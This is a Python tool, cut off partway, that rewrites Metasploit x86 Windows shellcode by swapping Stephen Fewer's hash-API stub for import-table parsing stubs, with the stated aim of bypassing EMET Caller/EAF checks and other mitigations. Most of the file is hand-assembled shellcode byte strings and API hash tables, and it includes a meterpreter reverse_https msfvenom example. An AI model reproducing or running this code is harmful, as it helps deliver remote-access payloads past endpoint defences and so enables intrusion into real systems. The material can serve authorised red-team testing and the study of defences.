#!/usr/bin/env python3

from __future__ import print_function
from collections import OrderedDict
from capstone import *
from capstone.x86 import *
import struct
import pefile
import io
import sys
import re
import random
import string
import argparse
import binascii
import signal
import json
import os
import ntpath

def signal_handler(signal, frame):
        print('\nProgram Exit')
        sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)

parser = argparse.ArgumentParser(description="""This code imports metasploit sourced x86 windows shellcode that employs 
Stephen Fewers Hash API stub and replaces it to bypass EMET Caller/EAF checks
and other bolt on mitigations. Accepts msfvenom output from stdin or from disk. 
Doesn't do logic checks on provided payload to ensure it is x86 (32bit) or for windows 
OS (up to you to be correct)""",
        usage='use "%(prog)s --help" for more information',
        formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument('infile', nargs='?', type=argparse.FileType('r'),
                     default=sys.stdin)
parser.add_argument("-b", "--targetbinary", default="", dest="targetbinary", 
                    action="store", 
                    help="Binary that shellcode will be customized to (Optional)"
                    )
parser.add_argument("-t", "--OSTarget", default="Win7", dest="OS",
                    action="store",
                    help="OS target for looking for target DLL Import Tables: win7, win8, winVista, win10")
parser.add_argument("-s", '--shellcode', default="", dest="code",
                    action="store",
                    help="x86 Win Shellcode with Stephen Fewers Hash API prepended (from msfvenom) can be from stdin")
parser.add_argument("-d", '--DLLName', default="", dest="dll", action="store",
                    help="If you know the DLL you are targeting enter this, no need for OS, DLL flags")
parser.add_argument('-m', '--mangle', default=False, dest="mangle",
                    action="store_true", 
                    help="Mangle metasploit hash apis from their original values (you want to do this)")
parser.add_argument('outfile', nargs='?', type=argparse.FileType('w'),
                    default=sys.stdout,
                    )                          
parser.add_argument('-o', '--output', dest="OUTPUT", action="store", default='stdout', 
                    help="How you would like your output: [c], [p]ython, c[s]harp"
                    )
parser.add_argument("-p", "--parser_stub", dest="parser_stub", action="store", default='GPA', 
                    help="""By default this assumes that GetProcAddress (GPA) is in the targetbinary's
Import Address Table (IAT) if no targetbinary or DLL name is provided.
Four options:
    GPA  - GPA is in targetbinary IAT (default)
    LLAGPA - LoadlibraryA(LLA)/GPA is in the targetbinary IAT (smallest shellcode option)
    ExternGPA -- need DLLName or targetbinary to use
    ExternLLAGPA -- need DLLName or targetbinary to use
                    """
                    )

args = parser.parse_args()



#print("DEBUG ARGS:", args, args.infile.buffer.seekable())
if args.infile.buffer.seekable() is False:
    # READ from stdin because content is there
    args.code = args.infile.buffer.read()

if not args.code:
    print('[!] -s is required either from cmd line flag or stdin <cat code.bin> | {0}'.format(sys.argv[0]))
    parser.print_help()
    sys.exit(-1)        

class x86_windows_metasploit:
    
    '''
    Inputs:
        Any metasploit source windows x86 shellcode/payload that 
        employs Stephen Fewers hash api STUB.
         msfvenom -p windows/meterpreter/reverse_https LHOST=127.0.0.1 PORT=8080 EXIT=Process | 
         ./thisscript.py <optional binary of shellcode> <optional targetbinary> <optional operating system target> <optional dll name as the target> 
         optional targetbinary = by default it will assume LoadLibraryA and GetProcAddress is in the target Import Address Table (IAT). If 
            the target binary is provided it will look at the imported DLLs from the windows OS to determine if their IATs contain 
            LLA/GPA or just GPA and use that.


         Optional target OS: default Win7.


    Outputs:
        A payload tailored to that binary - in c, csharp, binary, bin file outputs.

    '''

    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        self.tracker = []
        self.arch = CS_ARCH_X86
        self.mode = CS_MODE_32
        self.syntax = 0
        self.api_hashes = {}
        self.called_apis = []
        self.string_table = ''
        self.tracker_dict = {}
        self.block_order = []
        self.DLL_HASH = 0
        self.lla_hash_dict = {}
        self.gpa_hash_dict = {}
        
        if self.OUTPUT == 'stdout':
            # suppress print
            self.VERBOSE = False
        
        # Length 136
        self.fewerapistub = bytes("\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b\x50\x30"
                            "\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
                            "\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf2\x52"
                            "\x57\x8b\x52\x10\x8b\x4a\x3c\x8b\x4c\x11\x78\xe3\x48\x01\xd1"
                            "\x51\x8b\x59\x20\x01\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b"
                            "\x01\xd6\x31\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03"
                            "\x7d\xf8\x3b\x7d\x24\x75\xe4\x58\x8b\x58\x24\x01\xd3\x66\x8b"
                            "\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24"
                            "\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x5f\x5f\x5a\x8b\x12\xeb"
                            "\x8d", 'iso-8859-1')

        
        
        # This hash list could be longer

        self.hashes = [  ( 0x006B8029, "ws2_32.dll!WSAStartup" ),
                         ( 0xE0DF0FEA, "ws2_32.dll!WSASocketA" ),
                         ( 0x33BEAC94, 'ws2_32.dll!WSAaccept'),
                         ( 0x6737DBC2, "ws2_32.dll!bind" ),
                         ( 0xFF38E9B7, "ws2_32.dll!listen" ),
                         ( 0xE13BEC74, "ws2_32.dll!accept" ),
                         ( 0x614D6E75, "ws2_32.dll!closesocket" ),
                         ( 0x6174A599, "ws2_32.dll!connect" ),
                         ( 0x5FC8D902, "ws2_32.dll!recv" ),
                         ( 0x5F38EBC2, "ws2_32.dll!send" ),
                         ( 0x5BAE572D, "kernel32.dll!WriteFile" ),
                         ( 0x4FDAF6DA, "kernel32.dll!CreateFileA" ),
                         ( 0x13DD2ED7, "kernel32.dll!DeleteFileA" ),
                         ( 0xE449F330, "kernel32.dll!GetTempPathA" ),
                         ( 0x528796C6, "kernel32.dll!CloseHandle" ),
                         ( 0x863FCC79, "kernel32.dll!CreateProcessA" ),
                         ( 0xE553A458, "kernel32.dll!VirtualAlloc" ),
                         ( 0x300F2F0B, "kernel32.dll!VirtualFree" ),
                         ( 0x0726774C, "kernel32.dll!LoadLibraryA" ),
                         ( 0x7802F749, "kernel32.dll!GetProcAddress" ),
                         ( 0x601D8708, "kernel32.dll!WaitForSingleObject" ),
                         ( 0x876F8B31, "kernel32.dll!WinExec" ),
                         ( 0x9DBD95A6, "kernel32.dll!GetVersion" ),
                         ( 0xEA320EFE, "kernel32.dll!SetUnhandledExceptionFilter" ),
                         ( 0x56A2B5F0, "kernel32.dll!ExitProcess" ),
                         ( 0x0A2A1DE0, "kernel32.dll!ExitThread" ),
                         ( 0x6F721347, "ntdll.dll!RtlExitUserThread" ),
                         ( 0x23E38427, "advapi32.dll!RevertToSelf" ),
                         ( 0xa779563a, "wininet.dll!InternetOpenA"),
                         ( 0xc69f8957, "wininet.dll!InternetConnectA"),
                         ( 0x3B2E55EB, "wininet.dll!HttpOpenRequestA"),
                         ( 0x869E4675, "wininet.dll!InternetSetOptionA"),
                         ( 0x7B18062D, "wininet.dll!HttpSendRequestA"),
                         ( 0xE2899612, "wininet.dll!InternetReadFile"),
              ]    

    def lla_gpa_parser_stub(self):
        shellcode =  bytes( 
               "\xfc"
               "\x60"                          # pushad
               "\x8B\xEC"
               "\x31\xd2"                      # xor edx, edx                          ;prep edx for use
               "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
               "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
               "\x8b\xda"                      # mov ebx, edx                          ;Set ebx to imagebase
               "\x03\x52\x3c"                  # add edx, dword ptr [edx + 0x3c]       ;"PE"
               "\x8b\xba\x80\x00\x00\x00"      # mov edi, dword ptr [edx + 0x80]       ;Import Table RVA
               "\x03\xfb"                      # add edi, ebx                          ;Import table in memory offset

               #findImport:
               "\x8b\x57\x0c"                  # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
               "\x03\xd3"                      # add edx, ebx                          ;Offset in memory
               "\x81\x3a\x4b\x45\x52\x4e"      # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
               "\x74\x05"                      # je 0x102f                             ;jmp saveBase
               "\x83\xc7\x14"                  # add edi, 0x14                         ;inc to next import
               "\xeb\xee"                      # jmp 0x101d                            ;Jmp findImport

               #saveBase:
               "\x57"                          # push edi                              ;save addr of import base
               "\xeb\x3e"                      # jmp 0x106e                            ;jmp loadAPIs

               #setBounds:
               #;this is needed as the parsing could lead to eax ptr's to unreadable addresses
               "\x8b\x57\x10"                  # mov edx, dword ptr [edi + 0x10]       ;Point to API name
               "\x03\xd3"                      # add edx, ebx                          ;Adjust to in memory offset
               "\x8b\x37"                      # mov esi, dword ptr [edi]              ;Set ESI to the Named Import base
               "\x03\xf3"                      # add esi, ebx                          ;Adjust to in memory offset
               "\x8b\xca"                      # mov ecx, edx                          ;Mov in memory offset to ecx
               "\x81\xc1\x00\x00\xff\x00"      # add ecx, 0x40000                      ;Set an upper bounds for reading
               "\x33\xed"                      # xor ebp, ebp                          ;Zero ebp for thunk offset

               #findAPI:
               "\x8b\x06"                      # mov eax, dword ptr [esi]              ;Mov pointer to Named Imports
               "\x03\xc3"                      # add eax, ebx                          ;Find in memory offset
               "\x83\xc0\x02"                  # add eax, 2                            ;Adjust to ASCII name start
               "\x3b\xc8"                      # cmp ecx, eax                          ;Check if over bounds
               "\x72\x18"                      # jb 0x1066                             ;If not over, don't jump to increment
               "\x3b\xc2"                      # cmp eax, edx                          ;Check if under Named import
               "\x72\x14"                      # jb 0x1066                             ;If not over, don't jump to increment
               "\x3e\x8b\x7c\x24\x04"          # mov edi, dword ptr ds:[esp + 4]       ;Move API name to edi
               "\x39\x38"                      # cmp dword ptr [eax], edi              ;Check first 4 chars
               "\x75\x0b"                      # jne 0x1066                            ;If not a match, jump to increment
               "\x3e\x8b\x7c\x24\x08"          # mov edi, dword ptr ds:[esp + 8]       ;Move API 2nd named part to edi
               "\x39\x78\x08"                  # cmp dword ptr [eax + 8], edi          ;Check next 4 chars
               "\x75\x01"                      # jne 0x1066                            ;If not a match, jump to increment
               "\xc3"                          # ret                                   ;If a match, ret

               #Increment:
               "\x83\xc5\x04"                  # add ebp, 4                            ;inc offset
               "\x83\xc6\x04"                  # add esi, 4                            ;inc to next name
               "\xeb\xd5"                      # jmp 0x1043                            ;jmp findAPI

               #loadAPIs
               "\x68\x61\x72\x79\x41"          # push 0x41797261                       ;aryA (notice the 4 char jump between beginning)
               "\x68\x4c\x6f\x61\x64"          # push 0x64616f4c                       ;Load
               "\xe8\xb3\xff\xff\xff"          # call 0x1032                           ;call setBounds
               "\x03\xd5"                      # add edx, ebp                          ;In memory offset of API thunk
               "\x83\xc4\x08"                  # add ESP, 8                            ;Move stack to import base addr
               "\x5f"                          # pop edi                               ;restore import base addr for parsing
               "\x52"                          # push edx                              ;save LoadLibraryA thunk address on stack
               "\x68\x64\x64\x72\x65"          # push 0x65726464                       ;ddre
               "\x68\x47\x65\x74\x50"          # push 0x50746547                       ;Getp
               "\xe8\x9d\xff\xff\xff"          # call 0x1032                           ;call setBounds
               "\x03\xd5"                      # add edx, ebp                          ;
               "\x5d"                          # pop ebp                               ;
               "\x5d"                          # pop ebp                               ;
               "\x5b"                          # pop ebx                               ;Pop LoadlibraryA thunk addr into ebx
               "\x8b\xea"                      # mov ebp, edx                          ;Move GetProcaddress thunk addr into ebx
               , 'iso-8859-1')
               # LLA in EBX
               # GPA EBP
        return shellcode 
     
    def gpa_parser_stub(self): 
        shellcode = bytes( "\xfc"
               "\x60"                          # pushad
               "\x31\xd2"                      # xor edx, edx                          ;prep edx for use
               "\x64\x8b\x52\x30"              # mov edx, dword ptr fs:[edx + 0x30]    ;PEB
               "\x8b\x52\x08"                  # mov edx, dword ptr [edx + 8]          ;PEB.imagebase
               "\x8b\xda"                      # mov ebx, edx                          ;Set ebx to imagebase
               #"\x8b\xc3"                      # mov eax, ebx                         ;Set eax to imagebase
               "\x03\x52\x3c"                  # add edx, dword ptr [edx + 0x3c]       ;"PE"
               "\x8b\xba\x80\x00\x00\x00"      # mov edi, dword ptr [edx + 0x80]       ;Import Table RVA
               "\x03\xfb"                      # add edi, ebx                          ;Import table in memory offset

               #findImport:
               "\x8b\x57\x0c"                  # mov edx, dword ptr [edi + 0xc]        ;Offset for Import Directory Table Name RVA
               "\x03\xd3"                      # add edx, ebx                          ;Offset in memory
               "\x81\x3a\x4b\x45\x52\x4e"      # cmp dword ptr [edx], 0x4e52454b       ;Replace this so any API can be called
               "\x74\x05"                      # je 0x102f                             ;jmp saveBase
               "\x83\xc7\x14"                  # add edi, 0x14                         ;inc to next import
               "\xeb\xee"                      # jmp 0x101d                            ;Jmp findImport

               #saveBase:
               "\x57"                          # push edi                              ;save addr of import base
               "\xeb\x3e"                      # jmp 0x106e                            ;jmp loadAPIs

               #setBounds:
               #;this is needed as the parsing could lead to eax ptr's to unreadable addresses
               "\x8b\x57\x10"                  # mov edx, dword ptr [edi + 0x10]       ;Point to API name
               "\x03\xd3"                      # add edx, ebx                          ;Adjust to in memory offset
               "\x8b\x37"                      # mov esi, dword ptr [edi]              ;Set ESI to the Named Import base
               "\x03\xf3"                      # add esi, ebx                          ;Adjust to in memory offset
               "\x8b\xca"                      # mov ecx, edx                          ;Mov in memory offset to ecx
               "\x81\xc1\x00\x00\xff\x00"      # add ecx, 0x40000                      ;Set an upper bounds for reading
               "\x33\xed"                      # xor ebp, ebp                          ;Zero ebp for thunk offset

               #findAPI:
               "\x8b\x06"                      # mov eax, dword ptr [esi]              ;Mov pointer to Named Imports
               "\x03\xc3"                      # add eax, ebx                          ;Find in memory offset
               "\x83\xc0\x02"                  # add eax, 2                            ;Adjust to ASCII name start
               "\x3b\xc8"                      # cmp ecx, eax                          ;Check if over bounds
               "\x72\x18"                      # jb 0x1066                             ;If not over, don't jump to increment
               "\x3b\xc2"                      # cmp eax, edx                          ;Check if under Named import
               "\x72\x14"                      # jb 0x1066                             ;If not over, don't jump to increment
               "\x3e\x8b\x7c\x24\x04"          # mov edi, dword ptr ds:[esp + 4]       ;Move API name to edi
               "\x39\x38"                      # cmp dword ptr [eax], edi              ;Check first 4 chars
               "\x75\x0b"                      # jne 0x1066                            ;If not a match, jump to increment
               "\x3e\x8b\x7c\x24\x08"          # mov edi, dword ptr ds:[esp + 8]       ;Move API 2nd named part to edi
               "\x39\x78\x08"                  # cmp dword ptr [eax + 8], edi          ;Check next 4 chars
               "\x75\x01"                      # jne 0x1066                            ;If not a match, jump to increment
               "\xc3"                          # ret                                   ;If a match, ret

               #Increment:
               "\x83\xc5\x04"                  # add ebp, 4                            ;inc offset
               "\x83\xc6\x04"                  # add esi, 4                            ;inc to next name
               "\xeb\xd5"                      # jmp 0x1043                            ;jmp findAPI

               #loadAPIs
               "\x68\x64\x64\x72\x65"          # push 0x65726464                       ;ddre
               "\x68\x47\x65\x74\x50"          # push 0x50746547                       ;Getp
               "\xe8\xb3\xff\xff\xff"          # call 0x1032                           ;call setBounds
               "\x03\xd5"                      # add edx, ebp                          ;
               "\x5d"                          # pop ebp                               ;
               "\x5d"                          # pop ebp                               ;
               "\x8b\xca"                      # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
               
               # GPA in ECX
               "\x89\xCD" # mov ebp, ecx           # mov GPA to ebp
               "\x31\xd2"                          # xor    edx,edx
               "\x64\x8b\x52\x30"                  # mov    edx,DWORD PTR fs:[edx+0x30]
               "\x8b\x52\x0c"                      # mov    edx,DWORD PTR [edx+0xc]
               "\x8b\x52\x14"                      # mov    edx,DWORD PTR [edx+0x14]
               "\x8b\x72\x28"                      # mov    esi,DWORD PTR [edx+0x28]
               "\x6a\x18"                          # push   0x18
               "\x59"                              # pop    ecx
               "\x31\xff"                          # xor    edi,edi
               "\x31\xc0"                          # xor    eax,eax
               "\xac"                              # lods   al,BYTE PTR ds:[esi]
               "\x3c\x61"                          # cmp    al,0x61
               "\x7c\x02"                          # jl     0x20
               "\x2c\x20"                          # sub    al,0x20
               "\xc1\xcf\x0d"                      # ror    edi,0xd
               "\x01\xc7"                          # add    edi,eax
               "\xe2\xf0"                          # loop   0x17
               "\x81\xff\x5b\xbc\x4a\x6a"          # cmp    edi,0x6a4abc5b
               "\x8b\x5a\x10"                      # mov    ebx,DWORD PTR [edx+0x10]
               "\x8b\x12"                          # mov    edx,DWORD PTR [edx]
               "\x75\xdb"                          # jne    0xf
               # kernel32.dll in ebx
               "\x6A\x00"                 # push 0
               "\x68\x61\x72\x79\x41"     # push LoadLibraryA\x00
               "\x68\x4c\x69\x62\x72"
               "\x68\x4c\x6f\x61\x64" 
               "\x54"                     # push esp
               "\x53"                     # push ebx (kernerl32.dll handle)
               "\x89\xE9"                 # mov ecx,ebp getprocaddr
               "\xFF\x11"                 # call dword ptr [ecx]  # call dword ptr [ecx] 
               "\x50"                     # push eax ; LLA in EAX
               "\x89\xe3"                 # mov ebx, esp ; mov ptr to LLA in ebx
               "\x58"                     # pop eax, to align stack
               "\x58"                     # pop eax, to align stack
               "\x58"                     # pop eax, to align stack
               "\x58"                     # pop eax, to align stack
               "\x58"                     # pop eax, to align stack
               "\x58"                     # pop eax, to align stack

               
               , 'iso-8859-1')
        return shellcode 
        # LOADLIBA in EBX
        # GETPROCADDR in EBP
        
    def loaded_lla_gpa_parser_stub(self):            
        shellcode1 = bytes(  # Locate ADVAPI32 via PEB Ldr.InMemoryOrderModuleList ref:http://blog.harmonysecurity.com/2009_06_01_archive.html
                 "\xfc"                         # 00000002  FC                cld
                 "\x60"                          # pushad  
                 "\x31\xd2"                     # 00000003  31D2              xor edx,edx
                 "\x64\x8b\x52\x30"             # 00000005  648B5230          mov edx,[fs:edx+0x30]
                 "\x8b\x52\x0c"                 # 00000009  8B520C            mov edx,[edx+0xc]
                 "\x8b\x52\x14"                 # 0000000C  8B5214            mov edx,[edx+0x14]
                 # next_mod
                 "\x8b\x72\x28"                 # 0000000F  8B7228            mov esi,[edx+0x28]
                 "\x6a\x18"                     # 00000012  6A18              push byte +0x18
                 "\x59"                         # 00000014  59                pop ecx
                 "\x31\xff"                     # 00000015  31FF              xor edi,edi
                 # loop_modname
                 "\x31\xc0"                     # 00000017  31C0              xor eax,eax
                 "\xac"                         # 00000019  AC                lodsb
                 "\x3c\x61"                     # 0000001A  3C61              cmp al,0x61
                 "\x7c\x02"                     # 0000001C  7C02              jl 0x20
                 "\x2c\x20"                     # 0000001E  2C20              sub al,0x20
                 # not_lowercase
                 "\xc1\xcf\x0d"                 # 00000020  C1CF0D            ror edi,byte 0xd
                 "\x01\xc7"                     # 00000023  01C7              add edi,eax
                 "\xe2\xf0"                     # 00000025  E2F0              loop 0x17
                 
                 , 'iso-8859-1')

        shellcode2 = b"\x81\xff"
        shellcode2 += struct.pack("<I", self.DLL_HASH)
    
        shellcode3 = bytes("\x8b\x5a\x10"                 # 0000002D  8B5A10            mov ebx,[edx+0x10]
             "\x8b\x12"                     # 00000030  8B12              mov edx,[edx]
             "\x75\xdb"                     # 00000032  75DB              jnz 0xf
             # iatparser
             "\x89\xda"                     # 00000037  89DA              mov edx,ebx
             "\x03\x52\x3c"                 # 00000039  03523C            add edx,[edx+0x3c]
             "\x8b\xba\x80\x00\x00\x00"     # 0000003C  8BBA80000000      mov edi,[edx+0x80]
             "\x01\xdf"                     # 00000042  01DF              add edi,ebx
             # findImport
             "\x8b\x57\x0c"                 # 00000046  8B570C            mov edx,[edi+0xc]
             "\x01\xda"                     # 00000049  01DA              add edx,ebx
             "\x81\x3a\x4b\x45\x52\x4e"     # 0000004B  813A4B45524E      cmp dword [edx],0x4e52454b
             "\x81\x7a\x04\x45\x4c\x33\x32"  # 00000051  817A04454C3332    cmp dword [edx+0x4],0x32334c45
             "\x74\x05"                     # 00000058  7405              jz 0x5f
             "\x83\xc7\x14"                 # 0000005A  83C714            add edi,byte +0x14
             "\xeb\xe7"                     # 0000005D  EBE5              jmp short 0x44
             # saveBase
             "\x57"                         # 0000005F  57                push edi
             "\xeb\x39"                     # 00000060  EB3D              jmp short 0x9f
             # setbounds
             "\x8b\x57\x10"                 # 00000064  8B5710            mov edx,[edi+0x10]
             "\x01\xda"                     # 00000067  01DA              add edx,ebx
             "\x8b\x37"                     # 00000069  8B37              mov esi,[edi]
             "\x01\xde"                     # 0000006B  01DE              add esi,ebx
             "\x89\xd1"                     # 0000006D  89D1              mov ecx,edx    
             "\x81\xc1\x00\x00\xff\x00"     # 0000006F  81C10000FF00      add ecx,0xff0000
             "\x31\xed"                     # 00000075  31ED              xor ebp,ebp
             # findApi
             "\x8b\x06"                     # 00000079  8B06              mov eax,[esi]
             "\x01\xd8"                     # 0000007B  01D8              add eax,ebx
             "\x83\xc0\x02"                 # 0000007D  83C002            add eax,byte +0x2
             "\x39\xc1"                     # 00000080  39C1              cmp ecx,eax
             "\x72\x13"                     # 00000082  7213              jc 0x97
             "\x8b\x7c\x24\x04"             # 00000084  8B7C2404          mov edi,[esp+0x4]
             "\x39\x38"                     # 00000088  3938              cmp [eax],edi
             "\x75\x0b"                     # 0000008A  750B              jnz 0x97
             "\x3e\x8b\x7c\x24\x08"         # 0000008C  3E8B7C2408        mov edi,[ds:esp+0x8]
             "\x39\x78\x08"                 # 00000091  397808            cmp [eax+0x8],edi
             "\x75\x01"                     # 00000094  7501              jnz 0x97
             "\xc3"                         # 00000096  C3                ret
             # Increment
             "\x83\xc5\x04"                 # 00000097  83C504            add ebp,byte +0x4
             "\x83\xc6\x04"                 # 0000009A  83C604            add esi,byte +0x4
             "\xeb\xda"                     # 0000009D  EBD8              jmp short 0x77
             # loadApis
             "\x68\x61\x72\x79\x41"         # 000000A1  6861727941        push dword 0x41797261
             "\x68\x4c\x6f\x61\x64"         # 000000A6  684C6F6164        push dword 0x64616f4c
             "\xe8\xb8\xff\xff\xff"         # 000000AB  E8B2FFFFFF        call dword 0x62
             "\x01\xea"                     # 000000B0  01EA              add edx,ebp
             "\x83\xc4\x08"                 # 000000B2  83C408            add esp,byte +0x8
             "\x5f"                         # 000000B5  5F                pop edi
             "\x52"                         # 000000B6  52                push edx
             "\x68\x64\x64\x72\x65"         # 000000B7  6864647265        push dword 0x65726464
             "\x68\x47\x65\x74\x50"         # 000000BC  6847657450        push dword 0x50746547
             "\xe8\xA2\xff\xff\xff"         # 000000C1  E89CFFFFFF        call dword 0x62
             "\x01\xea"                     # 000000C6  01EA              add edx,ebp
             "\x5d"                         # 000000C8  5D                pop ebp
             "\x5d"                         # 000000C9  5D                pop ebp
             "\x5b"                         # 000000CA  5B                pop ebx
             "\x8b\xea"                     # 000000CB  89D1              mov ebp,edx    
            , 'iso-8859-1')
                   # LOADLIBA in EBX
                   # GETPROCADDR in EBP
    
        return shellcode1 + shellcode2 + shellcode3
        
    def loaded_gpa_iat_parser_stub(self):
        shellcode1 = bytes("\xfc"                         # 00000002  FC                cld
                     "\x60"                          # pushad
                     "\x31\xd2"                     # 00000003  31D2              xor edx,edx
                     "\x64\x8b\x52\x30"             # 00000005  648B5230          mov edx,[fs:edx+0x30]
                     "\x8b\x52\x0c"                 # 00000009  8B520C            mov edx,[edx+0xc]
                     "\x8b\x52\x14"                 # 0000000C  8B5214            mov edx,[edx+0x14]
                     # next_mod
                     "\x8b\x72\x28"                 # 0000000F  8B7228            mov esi,[edx+0x28]
                     "\x6a\x18"                     # 00000012  6A18              push byte +0x18
                     "\x59"                         # 00000014  59                pop ecx
                     "\x31\xff"                     # 00000015  31FF              xor edi,edi
                     # loop_modname
                     "\x31\xc0"                     # 00000017  31C0              xor eax,eax
                     "\xac"                         # 00000019  AC                lodsb
                     "\x3c\x61"                     # 0000001A  3C61              cmp al,0x61
                     "\x7c\x02"                     # 0000001C  7C02              jl 0x20
                     "\x2c\x20"                     # 0000001E  2C20              sub al,0x20
                     # not_lowercase
                     "\xc1\xcf\x0d"                 # 00000020  C1CF0D            ror edi,byte 0xd
                     "\x01\xc7"                     # 00000023  01C7              add edi,eax
                     "\xe2\xf0"                     # 00000025  E2F0              loop 0x17
                     , "iso-8859-1")
        
        shellcode2 = b"\x81\xff"
        shellcode2 += struct.pack("<I", self.DLL_HASH)
    
    
        shellcode3 = bytes("\x8b\x5a\x10"                 # 0000002D  8B5A10            mov ebx,[edx+0x10]
                     "\x8b\x12"                     # 00000030  8B12              mov edx,[edx]
                     "\x75\xdb"                     # 00000032  75DB              jnz 0xf
                     # iatparser
                     "\x89\xda"                     # 00000037  89DA              mov edx,ebx
                     "\x03\x52\x3c"                 # 00000039  03523C            add edx,[edx+0x3c]
                     "\x8b\xba\x80\x00\x00\x00"     # 0000003C  8BBA80000000      mov edi,[edx+0x80]
                     "\x01\xdf"                     # 00000042  01DF              add edi,ebx
                     # findImport
                     "\x8b\x57\x0c"                 # 00000046  8B570C            mov edx,[edi+0xc]
                     "\x01\xda"                     # 00000049  01DA              add edx,ebx
                     "\x81\x3a\x4b\x45\x52\x4e"     # 0000004B  813A4B45524E      cmp dword [edx],0x4e52454b
                     "\x81\x7a\x04\x45\x4c\x33\x32"  # 00000051  817A04454C3332    cmp dword [edx+0x4],0x32334c45
                     "\x74\x05"                     # 00000058  7405              jz 0x5f
                     "\x83\xc7\x14"                 # 0000005A  83C714            add edi,byte +0x14
                     "\xeb\xe7"                     # 0000005D  EBE5              jmp short 0x44
                     # saveBase
                     "\x57"                         # 0000005F  57                push edi
                     "\xeb\x39"                     # 00000060  EB39              jmp short 0x9f
                     # setbounds
                     "\x8b\x57\x10"                 # 00000064  8B5710            mov edx,[edi+0x10]
                     "\x01\xda"                     # 00000067  01DA              add edx,ebx
                     "\x8b\x37"                     # 00000069  8B37              mov esi,[edi]
                     "\x01\xde"                     # 0000006B  01DE              add esi,ebx
                     "\x89\xd1"                     # 0000006D  89D1              mov ecx,edx
                     # this can be set based on the size of the .data section of the exploted binary or
                     # for the exploited DLL ... 0xff0000 for now.
                     #"\x81\xc1\x00\x00\x04\x00"      # add ecx, 0x40000                      ;Set an upper bounds for reading
                        
                     "\x81\xc1\x00\x00\xff\x00"     # 0000006F  81C10000FF00      add ecx,0xff0000
                     
                     "\x31\xed"                     # 00000075  31ED              xor ebp,ebp
                     # findApi
                     "\x8b\x06"                     # 00000079  8B06              mov eax,[esi]
                     "\x01\xd8"                     # 0000007B  01D8              add eax,ebx
                     "\x83\xc0\x02"                 # 0000007D  83C002            add eax,byte +0x2
                     "\x39\xc1"                     # 00000080  39C1              cmp ecx,eax
                     "\x72\x13"                     # 00000082  7213              jc 0x97
                     "\x8b\x7c\x24\x04"             # 00000084  8B7C2404          mov edi,[esp+0x4]
                     "\x39\x38"                     # 00000088  3938              cmp [eax],edi
                     "\x75\x0b"                     # 0000008A  750B              jnz 0x97
                     "\x3e\x8b\x7c\x24\x08"         # 0000008C  3E8B7C2408        mov edi,[ds:esp+0x8]
                     "\x39\x78\x08"                 # 00000091  397808            cmp [eax+0x8],edi
                     "\x75\x01"                     # 00000094  7501              jnz 0x97
                     "\xc3"                         # 00000096  C3                ret
                     # Increment
                     "\x83\xc5\x04"                 # 00000097  83C504            add ebp,byte +0x4
                     "\x83\xc6\x04"                 # 0000009A  83C604            add esi,byte +0x4
                     "\xeb\xda"                     # 0000009D  EBDA              jmp short 0x77
                     # loadApis
                     "\x68\x64\x64\x72\x65"          # push 0x65726464                       ;ddre
                     "\x68\x47\x65\x74\x50"          # push 0x50746547                       ;Getp
                     "\xe8\xb8\xff\xff\xff"          # call 0x1032                           ;call setBounds
                     "\x03\xd5"                      # add edx, ebp                          ;
                     "\x5d"                          # pop ebp                               ;
                     "\x5d"                          # pop ebp                               ;
                     "\x8b\xca"                      # mov ecx, edx                          ;Move GetProcaddress thunk addr into ecx
                     , 'iso-8859-1')
                    #GPA in ECX
        shellcode3 += b"\x89\xCD" # mov ebp, ecx GPA in EBP
        shellcode3 += bytes("\x31\xd2"                          # xor    edx,edx
                      "\x64\x8b\x52\x30"                  # mov    edx,DWORD PTR fs:[edx+0x30]
                      "\x8b\x52\x0c"                      # mov    edx,DWORD PTR [edx+0xc]
                      "\x8b\x52\x14"                      # mov    edx,DWORD PTR [edx+0x14]
                      "\x8b\x72\x28"                      # mov    esi,DWORD PTR [edx+0x28]
                      "\x6a\x18"                          # push   0x18
                      "\x59"                              # pop    ecx
                      "\x31\xff"                          # xor    edi,edi
                      "\x31\xc0"                          # xor    eax,eax
                      "\xac"                              # lods   al,BYTE PTR ds:[esi]
                      "\x3c\x61"                          # cmp    al,0x61
                      "\x7c\x02"                          # jl     0x20
                      "\x2c\x20"                          # sub    al,0x20
                      "\xc1\xcf\x0d"                      # ror    edi,0xd
                      "\x01\xc7"                          # add    edi,eax
                      "\xe2\xf0"                          # loop   0x17
                      "\x81\xff\x5b\xbc\x4a\x6a"          # cmp    edi,0x6a4abc5b
                      "\x8b\x5a\x10"                      # mov    ebx,DWORD PTR [edx+0x10]
                      "\x8b\x12"                          # mov    edx,DWORD PTR [edx]
                      "\x75\xdb"                          # jne    0xf
                      , 'iso-8859-1')
    
        # kernel32.dll in ebx
        shellcode3 += bytes("\x6A\x00"                 # push 0
                       "\x68\x61\x72\x79\x41"     # push LoadLibraryA\x00
                       "\x68\x4c\x69\x62\x72"
                       "\x68\x4c\x6f\x61\x64" 
                       "\x54"                     # push esp
                       "\x53"                     # push ebx (kernerl32.dll handle)
                       "\x89\xE9"                 # mov ecx,ebp getprocaddr
                       "\xFF\x11"                 # call dword ptr [ecx]  # call dword ptr [ecx] 
                       "\x50"                     # push eax ; LLA in EAX
                       "\x89\xe3"                 # mov ebx, esp ; mov ptr to LLA in ebx
                       "\x58"                     # pop eax, to align stack
                       "\x58"                     # pop eax, to align stack
                       "\x58"                     # pop eax, to align stack
                       "\x58"                     # pop eax, to align stack
                       "\x58"                     # pop eax, to align stack
                       "\x58"                     # pop eax, to align stack

